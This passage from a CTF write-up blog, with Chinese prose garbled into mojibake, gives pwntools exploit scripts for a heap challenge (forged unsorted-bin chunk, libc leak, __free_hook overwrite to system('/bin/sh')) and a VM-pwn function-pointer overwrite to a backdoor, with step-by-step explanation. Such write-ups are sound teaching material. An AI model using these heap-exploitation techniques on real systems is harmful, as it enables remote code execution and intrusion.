class="string">&#x27;-hp&#x27;</span>, <span class="string">&#x27;65&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="keyword">if</span> libc_path_local:</span><br><span class="line">        io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path_local&#125;)</span><br><span class="line">        libc = ELF(libc_path_local)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25965</span>)</span><br><span class="line">    <span class="keyword">if</span> libc_path_remote:</span><br><span class="line">        libc = ELF(libc_path_remote)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print ./WriteMaster&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line">_add,_free,_show,_edit = <span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">666</span></span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;:&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx, header, size, content</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_add))</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;header size:&quot;</span>, <span class="built_in">str</span>(<span class="number">0x20</span>))</span><br><span class="line">    sa(<span class="string">&quot;header:&quot;</span>, header)</span><br><span class="line">    sla(<span class="string">&quot;text size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_free))</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_show))</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_edit))</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&#x27;text:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    add(<span class="number">0</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)) * (<span class="number">0x60</span> / <span class="number">0x10</span>))</span><br><span class="line">    add(<span class="number">1</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">    add(<span class="number">2</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">    add(<span class="number">3</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">    add(<span class="number">4</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">    add(<span class="number">5</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">    add(<span class="number">6</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) * (<span class="number">0x60</span> / <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    </span><br><span class="line">    show(<span class="number">5</span>)</span><br><span class="line">    ru(<span class="string">&#x27;text:&#x27;</span>)</span><br><span class="line">    heap = uu64(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:]) &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">    echo(<span class="string">&#x27;HEAP BASE:&#x27;</span> + <span class="built_in">hex</span>(heap))</span><br><span class="line">    edit(<span class="number">3</span>, p64(heap + <span class="number">0x2c0</span> + <span class="number">0x50</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        add(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0x10</span>) + p64(heap) +  p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + <span class="string">&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x431</span>))</span><br><span class="line"></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    leak = uu64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]) - <span class="number">96</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    echo(<span class="string">&#x27;LIBC BASE:&#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">    libc.address = leak</span><br><span class="line">    __free_hook = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    add(<span class="number">12</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">13</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">13</span>)</span><br><span class="line">    free(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">12</span>, p64(__free_hook))</span><br><span class="line">    add(<span class="number">13</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x30</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    add(<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x30</span>, p64(system))</span><br><span class="line">    free(<span class="number">13</span>)</span><br><span class="line">    <span class="comment"># gdba()</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
<h5 id="ä¼ªé€ ubè¯¦è§£"><a href="#ä¼ªé€ ubè¯¦è§£" class="headerlink" title="ä¼ªé€ ubè¯¦è§£"></a>ä¼ªé€ ubè¯¦è§£</h5><p>ç¨‹åºä¸­è¿˜æœ‰ä¸ªå°æ¼æ´ï¼Œå°±æ˜¯addçš„æ—¶å€™indexå¯ä»¥ç”±æˆ‘ä»¬è‡ªå·±æ¥æŒ‡å®šï¼Œè¿™æ ·å°±é€ æˆäº†ä¹‹å‰å†™è¿‡çš„åœ¨å†…å­˜ä¸­çš„æ•°æ®å¯èƒ½ä¼šè¢«è¦†ç›–ï¼Œæ‰€ä»¥æå¤§å¢å¼ºäº†æˆ‘ä»¬çš„ä½“éªŒï¼Œæƒ³æ€ä¹ˆæ‰“éƒ½å¯ä»¥ï¼Œè€ƒçš„ç‚¹å°±æ˜¯å¦‚ä½•ä¼ªé€ å‡ºæ¥ä¸€å—ubï¼Œé‚£ä¹ˆè¯¦ç»†è®°å½•ä¸‹</p>
<p>æˆ‘æ˜¯è¾¹åšè¾¹ç»™å¸¦ğŸ”¥å†™çš„wpï¼Œé¦–å…ˆå†™éšä¾¿ç”³è¯·ä¸€é€šchunkï¼Œåœ¨chunk0ä¸­ä¼ªé€ ä¸€ä¸ªå‡çš„headerï¼Œæ—¥åå¯ä»¥è¦†ç›–chunk1çš„header</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>))</span><br><span class="line">add(<span class="number">1</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">    free(i)</span><br></pre></td></tr></table></figure>
<p><img src="/Users/lemon/Library/Application%20Support/typora-user-images/image-20211002165852836.png" alt=""></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">show(<span class="number">5</span>)</span><br><span class="line">ru(<span class="string">&#x27;text:&#x27;</span>)</span><br><span class="line">heap = uu64(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:]) &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">echo(<span class="string">&#x27;HEAP BASE:&#x27;</span> + <span class="built_in">hex</span>(heap))</span><br><span class="line">edit(<span class="number">3</span>, p64(heap + <span class="number">0x2b0</span>))</span><br></pre></td></tr></table></figure>
<p>æ³„éœ²å‡ºå †åœ°å€åï¼Œæ”¹ä¸ªfdä¸ºä¹‹å‰ä¼ªé€ çš„header</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv12qeb61bj612a04s3z702.jpg" alt=""></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    add(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x431</span>))</span><br></pre></td></tr></table></figure>
<p>å…¨éƒ¨ç”³è¯·å›æ¥ï¼Œæœ€ç»ˆä¼šç”³è¯·åˆ°fake chunkï¼Œç„¶åé¡ºåŠ¿æŠŠä¸‹ä¸€ä¸ªchunkçš„headerç»™ğŸ‘äº†</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv152umtcrj61b40awwgo02.jpg" alt=""></p>
<p>å°±åƒè¿™ä¸ªæ ·ï¼Œè¿™æ ·å°±æœ‰unsorted binï¼ˆä¸‹æ–‡è®°ä¸ºubï¼‰å¯ä»¥ç”¨äº†ï¼Œä½†æ˜¯freeçš„æ—¶å€™è¿˜è¦ä¼ªé€ ubçš„ä¸‹ä¸€ä¸ªchunkçš„headerè¦ä¸ç„¶è¿‡ä¸äº†checkï¼Œæ‰‹ç®—ä¸€æ³¢åç§»ï¼Œå¤§æ¦‚åœ¨æœ€åº•éƒ¨çš„chunké™„è¿‘ï¼Œæ‰€ä»¥æŠŠä¹‹å‰çš„expç¨å¾®æ”¹æ”¹ï¼Œ6å·chunkçš„å†…å®¹å…¨æ”¹ä¸ºåˆæ³•çš„headerï¼Œç›®å‰ä¸ºæ­¢expé•¿è¿™æ ·ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>))</span><br><span class="line">add(<span class="number">1</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) * (<span class="number">0x60</span> / <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">ru(<span class="string">&#x27;text:&#x27;</span>)</span><br><span class="line">heap = uu64(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:]) &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">echo(<span class="string">&#x27;HEAP BASE:&#x27;</span> + <span class="built_in">hex</span>(heap))</span><br><span class="line">edit(<span class="number">3</span>, p64(heap + <span class="number">0x2c0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    add(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x431</span>))</span><br></pre></td></tr></table></figure>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv158sjq5uj61he0e6tbj02.jpg" alt=""></p>
<p>fake ub ä¼ªé€ å®Œæˆï¼Œä¸‹é¢å°±æ˜¯leakå‡ºæ¥libcçš„åœ°å€</p>
<p>å°´å°¬ï¼Œä¼ªé€ å¥½çªç„¶å‘ç°ubåœ¨æ–‡ç« çš„headeréƒ¨åˆ†ï¼Œç¨‹åºæ²¡æœ‰headeréƒ¨åˆ†çš„freeåŠŸèƒ½ï¼Œåªèƒ½é‡æ–°ä¼ªé€ äº†ï¼Œæ€è·¯æ˜¯ä¸€æ ·çš„</p>
<p><img src="/Users/lemon/Library/Application%20Support/typora-user-images/image-20211002192548895.png" alt=""></p>
<p>ç»è¿‡ä¸€ç‚¹ä¿®æ”¹åå°†å…¶ä¼ªé€ åˆ°äº†idxä¸º1çš„ä½ç½®ï¼Œæ€è·¯æ˜¯ä¸€æ ·çš„ï¼Œç°ç»™å‡ºå‰é¢éƒ¨åˆ†çš„exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)) * (<span class="number">0x60</span> / <span class="number">0x10</span>))	<span class="comment"># æ— è„‘ä¼ªé€ </span></span><br><span class="line">add(<span class="number">1</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) * (<span class="number">0x60</span> / <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">ru(<span class="string">&#x27;text:&#x27;</span>)</span><br><span class="line">heap = uu64(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:]) &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">echo(<span class="string">&#x27;HEAP BASE:&#x27;</span> + <span class="built_in">hex</span>(heap))</span><br><span class="line">edit(<span class="number">3</span>, p64(heap + <span class="number">0x2c0</span> + <span class="number">0x50</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    add(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0x10</span>) + p64(heap) +  p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + <span class="string">&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x431</span>)) <span class="comment"># ä¼ªé€ ubï¼Œä¸­é—´æœ‰ä¸ªéƒ¨åˆ†å¡«å†™heapçš„åŸå› æ˜¯showçš„æ—¶å€™éœ€è¦å¯»å€ï¼Œéœ€è¦å¡«å†™ä¸€ä¸ªåˆæ³•åœ°å€</span></span><br></pre></td></tr></table></figure>
<p>ä¼ªé€ å‡ºubåé¢çš„å°±æ˜¯ç™½ç»™flagäº†</p>
<h3 id="caculator"><a href="#caculator" class="headerlink" title="caculator"></a>caculator</h3><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>ç®€ç®€å•å•çš„VM pwnï¼Œä¼°è®¡æ˜¯å…¨ç½‘æœ€ç®€å•çš„VM pwnäº†ï¼Œæä¾›äº†ç›´æ¥å’Œç¨‹åºæ¨¡æ‹Ÿçš„å¯„å­˜å™¨çš„äº¤äº’æ¥å£ï¼Œæ¼æ´ä½äºä¸€ä¸ªä»»æ„åœ°å€å†™ï¼Œbssä¸Šè¿˜æœ‰å‡½æ•°æŒ‡é’ˆï¼Œmainè¿˜è°ƒç”¨äº†è¿™ä¸ªæŒ‡é’ˆï¼Œç¨‹åºè¿˜æœ‰åé—¨ï¼Œæ”¹æŒ‡é’ˆä¸ºåé—¨å‡½æ•°ä¸€æŠŠğŸ”</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./caculator&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x40</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x400ba0</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x48</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x48</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x38</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(-<span class="number">8</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x50</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>ç”šè‡³å¯ä»¥ä¸ç”¨pwntoolsç›´æ¥ncä¸Šå»getshell</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv1d2sklx1j30fu0akq30.jpg" alt=""></p>
<h4 id="è¯¦è§£"><a href="#è¯¦è§£" class="headerlink" title="è¯¦è§£"></a>è¯¦è§£</h4><p>é™æ€ç¼–è¯‘ï¼ŒçŸ¥é“æœ‰äººæƒ³ğŸ”¨æˆ‘äº†</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv1b77v9kfj61020nygnj02.jpg" alt=""></p>
<p>çƒ­çŸ¥è¯†ï¼Œmainåœ¨rdiå¯„å­˜å™¨é‡Œ</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv1cuohlsrj60vk0bognn02.jpg" alt=""></p>
<p>å››è¡Œä»£ç ï¼Œç®€ç®€å•å•</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv1b9h2zqnj30xw0u0gqf.jpg" alt=""></p>
<p>ç¬¬äºŒä¸ªå‡½æ•°æ‰æ˜¯ä¸»è¦é€»è¾‘ï¼Œä¸€å †caseï¼ŒVM pwnæ²¡è·‘äº†</p>
<p>æ— è®ºæ˜¯ç»éªŒï¼Œè¿˜æ˜¯ç°æœï¼Œå…ˆç¡®å®šä¸€äº›ç³»ç»Ÿå‡½æ•°ï¼š<a target="_blank" rel="noopener" href="https://www.cnblogs.com/pengdonglin137/p/3345911.html">https://www.cnblogs.com/pengdonglin137/p/3345911.html</a></p>
<p>çœ‹åˆ°vaï¼Œprintfæˆ–è€…scanfç³»åˆ—çš„æ²¡è·‘äº†</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv1cwejlwyj30u00vqtdx.jpg" alt=""></p>
<p>ä¸ç®¡æ˜¯ç”¨ç¨‹åºçš„é€»è¾‘è¯•è¿˜æ˜¯é€†å‘éƒ½å¾ˆå®¹æ˜“ç¡®å®šå‡ºæ¥å‰å››ä¸ªcaseåˆ†åˆ«æ˜¯åŠ å‡ä¹˜é™¤</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv1cyytjt3j617i0kk78d02.jpg" alt=""></p>
<p>case 0x48å®ç°äº†popæ“ä½œï¼Œcase 0x40å®ç°äº†pushæ“ä½œï¼Œå¯ä»¥å‘æ ˆä¸Šå†™å…¥ä»»æ„æ•°æ®ï¼Œé€šè¿‡popå¯ä»¥æ§åˆ¶æˆ‘ä»¬è‡ªå·±å®ç°çš„å¯„å­˜å™¨regï¼Œå¹¶ä¸”case38å¯ä»¥å®ç°å‘ä»»æ„ä½ç½®å†™å…¥å¯„å­˜å™¨regçš„æ“ä½œï¼Œé€šè¿‡è¿™ä¸€å¥—æ“ä½œå®ç°äº†ä¸€ä¸ªä»»æ„åœ°å€å†™</p>
<p>æµç¨‹ï¼špush åé—¨å‡½æ•°åœ°å€ï¼Œpopå¼¹æ ˆï¼Œpopå¼¹æ ˆï¼ˆæ­¤æ—¶å¯„å­˜å™¨è¢«èµ‹å€¼ä¸ºåé—¨çš„åœ°å€ï¼‰ï¼Œåˆ©ç”¨ä»»æ„åœ°å€å†™å†™åˆ°å‡½æ•°æŒ‡é’ˆï¼Œé€€å‡ºæ‰§è¡Œgetshell</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv1d0ev2asj60v207ujsh02.jpg" alt=""></p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv1d1kiasaj619o0k4tec02.jpg" alt=""></p>
<p>å‡½æ•°æŒ‡é’ˆå°±åœ¨æ¨¡æ‹Ÿçš„æ ˆç©ºé—´çš„ä¸Šæ–¹ï¼Œç®—ä¸‹åç§»å¾ˆå®¹æ˜“ç®—å‡ºæ¥æ˜¯è´Ÿ8</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv1d3bty13j615g0o4wk602.jpg" alt=""></p>
<p>é€šè¿‡æŸ¥çœ‹å­—ç¬¦ä¸²å¯ä»¥æ‰¾åˆ°åé—¨</p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="bbbbbbaaaaaasssssseeeeee"><a href="#bbbbbbaaaaaasssssseeeeee" class="headerlink" title="bbbbbbaaaaaasssssseeeeee"></a>bbbbbbaaaaaasssssseeeeee</h3><p>ç»™äº†æ–‡æœ¬æ–‡ä»¶ï¼Œä¸€çœ¼è¿‡å»baseç¼–ç ï¼Œbaseè§£å®Œå‘ç°æ˜¯å¥—äº†ä¸åŒçš„baseï¼Œå†™ä¸ªè„šæœ¬å¾ªç¯è§£å¯†å®Œäº‹</p>
